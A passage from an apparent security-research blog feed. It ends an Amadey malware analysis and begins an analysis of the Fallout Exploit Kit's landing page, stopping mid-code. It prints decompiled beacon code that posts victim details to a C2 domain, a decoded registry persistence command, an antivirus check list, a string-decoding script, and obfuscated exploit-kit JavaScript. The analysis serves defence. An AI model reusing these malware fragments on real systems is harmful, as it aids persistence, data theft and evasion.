  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z12aGetUserNamev</span><span class="p">();</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="s">"&amp;"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">_Z9aFillCharPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffdff4</span><span class="p">);</span>
      <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z12aWinSockPostPcS_S_</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffddf4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0xffffdbf4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">);</span>
      <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffdff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
      <span class="n">_Z5aParsPcS_</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffdff4</span><span class="p">,</span><span class="s">"#"</span><span class="p">);</span>
      <span class="n">Sleep</span><span class="p">(</span><span class="n">_aTimeOut</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">_Z12aWinSockPostPcS_S_</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffddf4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0xffffdbf4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Some important parameters are encoded. However, the encoding algorithm is very simple.</p>

<p><img src="https://nao-sec.org/assets/2019-04-28/03.jpg" width="80%" /></p>

<p>key is <code class="language-plaintext highlighter-rouge">8ebd3994693b0d4976021758c2d7bff793b0d4976021758c2d7bff7</code></p>

<p><img src="https://nao-sec.org/assets/2019-04-28/04.jpg" width="100%" /></p>

<p>Finally, we analyze the decoded string and the name of the function in which it was used.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">_Z11aAutoRunSetPc</code>
    <ul>
      <li>AutoRunCmd : <code class="language-plaintext highlighter-rouge">REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v Startup /t REG_SZ /d </code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z8aCheckAVv</code>
    <ul>
      <li>AV00 : AVAST Software</li>
      <li>AV01 : Avira</li>
      <li>AV02 : Kaspersky Lab</li>
      <li>AV03 : ESET</li>
      <li>AV04 : Panda Security</li>
      <li>AV05 : Doctor Web</li>
      <li>AV06 : AVG</li>
      <li>AV07 : 360TotalSecurity</li>
      <li>AV08 : Bitdefender</li>
      <li>AV09 : Norton</li>
      <li>AV10 : Sophos</li>
      <li>AV11 : Comodo</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z12aWinSockPostPcS_S_</code>
    <ul>
      <li>CMD0 : <code class="language-plaintext highlighter-rouge">&lt;c&gt;</code></li>
      <li>CMD1 : <code class="language-plaintext highlighter-rouge">&lt;d&gt;</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z11aProcessDllPcS_</code>
    <ul>
      <li>dll : dll</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z7aRaportPcS_, _Z6aBasici</code>
    <ul>
      <li>domain : gohaiendo[.]com</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z19aGetSelfDestinationi</code>
    <ul>
      <li>DropDir : f64a428dfd</li>
      <li>DropName : cmualrc.exe</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z11aProcessExePcS_S_S_</code>
    <ul>
      <li>exe : exe</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z14aGetProgramDirv</code>
    <ul>
      <li>GetProgDir : ProgramData\</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z10aGetOsArchv, _Z6aGetOsv</code>
    <ul>
      <li>OS_AR0 : kernel32.dll</li>
      <li>OS_AR1 : GetNativeSystemInfo</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z6aBasici</code>
    <ul>
      <li>Param0 : id=</li>
      <li>Param1 : &amp;vs=</li>
      <li>Param2 : &amp;ar=</li>
      <li>Param3 : &amp;bi=</li>
      <li>Param4 : &amp;lv=</li>
      <li>Param5 : &amp;os=</li>
      <li>Param6 : &amp;av=</li>
      <li>Param7 : &amp;pc=</li>
      <li>Param8 : &amp;un=</li>
      <li>Vers : 1.22</li>
      <li>ZoneIdent : <code class="language-plaintext highlighter-rouge">:Zone.Identifier</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z12aWinSockPostPcS_S_</code>
    <ul>
      <li>Post0 : 1310</li>
      <li>Post1 : HTTP/1.1</li>
      <li>Post2 : Accept: <em>/</em></li>
      <li>Post3 : Content-Type: application/x-www-form-urlencoded</li>
      <li>Post4 : Host:</li>
      <li>Post5 : Content-Length:</li>
      <li>Post6 : POST /</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z11aRunAsAdminPc</code>
    <ul>
      <li>RunAs : runas</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z9aRunDll32PcS_</code>
    <ul>
      <li>RunDll_0 : rundll32.exe</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z7aRaportPcS_, _Z6aBasici</code>
    <ul>
      <li>Script : ppk/index.php</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z11aCheckAdminv</code>
    <ul>
      <li>Shell : SHELL32.DLL</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z14aCreateProcessPc, _Z6aBasici</code>
    <ul>
      <li>TimeOut : 40133-98-10017</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">_Z15aUrlMonDownloadPcS_</code>
    <ul>
      <li>URLMon_0 : urlmon</li>
      <li>URLMon_1 : URLDownloadToFileA</li>
    </ul>
  </li>
</ul>

<p>Here is the simple python script.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">'''
domain=[0x9F, 0xD4, 0xCA, 0xC5, 0x9C, 0x9E, 0xA7, 0x98, 0xA5, 0x67, 0x96, 0xD1, 0x9D]
AutoRunCmdr=[0x8A, 0xAA, 0xA9, 0x84, 0x74, 0x7D, 0x7D, 0x54, 0x58, 0x81, 0x7E, 0xA5, 0x85, 0xC0, 0x87, 0xA8, 0x9D, 0xAA, 0xA7, 0x93, 0xA3, 0x9C, 0x91, 0x85, 0xCC, 0x95, 0xD6, 0xA6, 0xD5, 0xD5, 0xCC, 0xAB, 0x95, 0x8A, 0xCB, 0x9E, 0xC8, 0xA3, 0xB0, 0xAA, 0x92, 0x73, 0xA7, 0xA3, 0xA9, 0x9A, 0xA6, 0xD7, 0x88, 0xC9, 0xA9, 0xD5, 0xCF, 0xD5, 0xA5, 0x94, 0xAA, 0xDA, 0xD4, 0x9F, 0xA8, 0xAB, 0x99, 0xA8, 0x95, 0x88, 0xD5, 0x95, 0xD6, 0x54, 0x8C, 0x9F, 0x9B, 0x9C, 0x9E, 0x51, 0x7D, 0xA4, 0xA4, 0xC7, 0x97, 0xD6, 0xAA, 0x84, 0x86, 0x95, 0x9D, 0x59, 0x62, 0xD8, 0x50, 0xB7, 0xA8, 0x9A, 0xA9, 0xAA, 0xA5, 0xA2, 0x51, 0x66, 0xA9, 0x58, 0xB5, 0x77, 0xAB, 0x96, 0xB5, 0xC0, 0x86, 0x66, 0x9C, 0x85]
AV00=[0x79, 0xBB, 0xA3, 0xB7, 0x87, 0x59, 0x8C, 0xA3, 0x9C, 0xAD, 0xAA, 0xC3, 0xA2, 0xC9]#AV00
AV01=[0x79, 0xDB, 0xCB, 0xD6, 0x94]
AV02=[0x83, 0xC6, 0xD5, 0xD4, 0x98, 0xAB, 0xAC, 0x9F, 0xAF, 0x59, 0x7F, 0xC3, 0x92]
AV03=[0x7D, 0xB8, 0xA7, 0xB8]
AV04=[0x88, 0xC6, 0xD0, 0xC8, 0x94, 0x59, 0x8C, 0x99, 0x99, 0xAE, 0xA5, 0xCB, 0xA4, 0xDD]
AV05=[0x7C, 0xD4, 0xC5, 0xD8, 0xA2, 0xAB, 0x59, 0x8B, 0x9B, 0x9B]
AV06=[0x79, 0xBB, 0xA9]
AV07=[0x6B, 0x9B, 0x92, 0xB8, 0xA2, 0xAD, 0x9A, 0xA0, 0x89, 0x9E, 0x96, 0xD7, 0xA2, 0xCD, 0xA8, 0xB2]
AV08=[0x7A, 0xCE, 0xD6, 0xC8, 0x98, 0x9F, 0x9E, 0xA2, 0x9A, 0x9E, 0xA5]
AV09=[0x86, 0xD4, 0xD4, 0xD8, 0xA2, 0xA7]
AV10=[0x8B, 0xD4, 0xD2, 0xCC, 0xA2, 0xAC]
AV11=[0x7B, 0xD4, 0xCF, 0xD3, 0x97, 0xA8]
CMD0=[0x74, 0xC8, 0xA0]
CMD1=[0x74, 0xC9, 0xA0]
DLL=[0x9C, 0xD1, 0xCE]
DropDir=[0x9E, 0x9B, 0x96, 0xC5, 0x67, 0x6B, 0x71, 0x98, 0x9C, 0x9D]
DropName=[0x9B, 0xD2, 0xD7, 0xC5, 0x9F, 0xAB, 0x9C, 0x62, 0x9B, 0xB1, 0x98]
exe=[0x9D, 0xDD, 0xC7]
GetProgDir=[0x88, 0xD7, 0xD1, 0xCB, 0xA5, 0x9A, 0xA6, 0x78, 0x97, 0xAD, 0x94, 0xBE]
OS_AR0=[0xA3, 0xCA, 0xD4, 0xD2, 0x98, 0xA5, 0x6C, 0x66, 0x64, 0x9D, 0x9F, 0xCE]
OS_AR1=[0x7F, 0xCA, 0xD6, 0xB2, 0x94, 0xAD, 0xA2, 0xAA, 0x9B, 0x8C, 0xAC, 0xD5, 0xA4, 0xC9, 0xA1, 0x82, 0xA5, 0x9C, 0x9F]
Param0=[0xA1, 0xC9, 0x9F]
Param1=[0x5E, 0xDB, 0xD5, 0xA1]
Param2=[0x5E, 0xC6, 0xD4, 0xA1]
Param3=[0x5E, 0xC7, 0xCB, 0xA1]
Param4=[0x5E, 0xD1, 0xD8, 0xA1]
Param5=[0x5E, 0xD4, 0xD5, 0xA1]
Param6=[0x5E, 0xC6, 0xD8, 0xA1]
Param7=[0x5E, 0xD5, 0xC5, 0xA1]
Param8=[0x5E, 0xDA, 0xD0, 0xA1]
Post0=[0x45, 0x6F]
Post1=[0x58, 0xAD, 0xB6, 0xB8, 0x83, 0x68, 0x6A, 0x62, 0x67]
Post2=[0x79, 0xC8, 0xC5, 0xC9, 0xA3, 0xAD, 0x73, 0x54, 0x60, 0x68, 0x5D]
Post3=[0x7B, 0xD4, 0xD0, 0xD8, 0x98, 0xA7, 0xAD, 0x61, 0x8A, 0xB2, 0xA3, 0xC7, 0x6A, 0x84, 0x95, 0xA9, 0xA7, 0xA2, 0x99, 0x95, 0x92, 0xAB, 0x9E, 0xA7, 0xD1, 0x61, 0xDC, 0x64, 0xD9, 0xDD, 0xDD, 0x64, 0x9F, 0xA2, 0xD4, 0x9D, 0x91, 0xA9, 0xAB, 0xA3, 0x9B, 0x9E, 0x95, 0xA0, 0x9B, 0x9A, 0x9C]
Post4=[0x80, 0xD4, 0xD5, 0xD8, 0x6D, 0x59]
Post5=[0x7B, 0xD4, 0xD0, 0xD8, 0x98, 0xA7, 0xAD, 0x61, 0x82, 0x9E, 0xA1, 0xC9, 0xA4, 0xCC, 0x6E, 0x59]
Post6=[0x88, 0xB4, 0xB5, 0xB8, 0x53, 0x68]
RunAs=[0xAA, 0xDA, 0xD0, 0xC5, 0xA6]
RunDll_0=[0xAA, 0xDA, 0xD0, 0xC8, 0x9F, 0xA5, 0x6C, 0x66, 0x64, 0x9E, 0xAB, 0xC7, 0x50]
Script=[0xA8, 0xD5, 0xCD, 0x93, 0x9C, 0xA7, 0x9D, 0x99, 0xAE, 0x67, 0xA3, 0xCA, 0xA0]
Shell=[0x8B, 0xAD, 0xA7, 0xB0, 0x7F, 0x6C, 0x6B, 0x62, 0x7A, 0x85, 0x7F]
TimeOut=[0x60, 0xEA, 0x00, 0x00, 0x44]
URLMon_0=[0xAD, 0xD7, 0xCE, 0xD1, 0xA2, 0xA7]
URLMon_1=[0x8D, 0xB7, 0xAE, 0xA8, 0xA2, 0xB0, 0xA7, 0xA0, 0xA5, 0x9A, 0x97, 0xB6, 0x9F, 0xAA, 0x9D, 0xA5, 0x9C, 0x77]
Vers=[0x69, 0x93, 0x94, 0x96]
ZoneIdent =[0x72, 0xBF, 0xD1, 0xD2, 0x98, 0x67, 0x82, 0x98, 0x9B, 0xA7, 0xA7, 0xCB, 0x96, 0xCD, 0x99, 0xAB]
'''</span>

<span class="n">encoded_str</span><span class="o">=</span><span class="p">[</span><span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">]</span>

<span class="n">Key</span><span class="o">=</span><span class="s">"8ebd3994693b0d4976021758c2d7bff793b0d4976021758c2d7bff7"</span>
<span class="n">c</span><span class="o">=</span><span class="mi">0</span>

<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">&lt;=</span> <span class="n">c</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">Key</span><span class="p">[</span><span class="n">c</span> <span class="o">%</span> <span class="n">length</span><span class="p">])),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
    <span class="c1">#print(encoded_str[c] - ord(Key[c % length]), end='')
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<h1 id="references">References</h1>
<ul>
  <li>https://krabsonsecurity.com/2019/02/13/analyzing-amadey-a-simple-native-malware/</li>
</ul>
]]></content:encoded>
<pubDate>2019-04-27T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analysis of Fallout Exploit Kit v3</title>
<link>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</link>
<guid>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We already tweeted, but the Fallout Exploit Kit has been updated. In the new Fallout, the traffic chain, obfuscation method of landing page and shellcode are changing. We will introduce details on the changes using <a href="http://malware-traffic-analysis.net/2019/02/28/index.html">Malware-Traffic-Analysis.net’s saz file</a>.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">New <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a> is using PoC on GitHub!<br />(CC: <a href="https://twitter.com/kafeine?ref_src=twsrc%5Etfw">@kafeine</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>)<a href="https://t.co/L1J5QOwJWn">https://t.co/L1J5QOwJWn</a><a href="https://t.co/ehhwtQqC5j">https://t.co/ehhwtQqC5j</a><a href="https://t.co/7opIhvSxg4">https://t.co/7opIhvSxg4</a> <a href="https://t.co/sJ1ESYpxbv">pic.twitter.com/sJ1ESYpxbv</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1100931219242442752?ref_src=twsrc%5Etfw">2019年2月28日</a></blockquote>


<h2 id="traffic">Traffic</h2>
<p>As usual HookAds Campaign will reach the landing page of Fallout and the attack will start. The flow of traffic is like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<h2 id="landing-page">Landing Page</h2>
<p>Let’s read the JavaScript on the landing page. Firstly, the objects necessary for decoding are defined.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">OygitP9</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">fZ2S0q</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">cMa5g</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span><span class="p">,</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">p2Z2Fkoy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">P1mnrrMi834</span><span class="p">(</span><span class="nx">MQVCd</span><span class="p">);</span> <span class="nx">p2Z2Fkoy</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">b8j5WMF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">negriNm4A3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">negriNm4A3</span><span class="p">)</span> <span class="p">?</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span> <span class="p">:</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span><span class="p">),</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">m3Z1Kc</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">T82SkC</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">OcKyWsdOFyq</span>
    <span class="p">},</span>
    <span class="na">jbRyz</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))),</span> <span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">b8j5WMF</span><span class="p">),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">qT8fpZ1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">)),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">m3Z1Kc</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">quSjT4yyl</span><span class="p">(</span><span class="nx">T82SkC</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">P1mnrrMi834</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">\r\n</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">);</span>
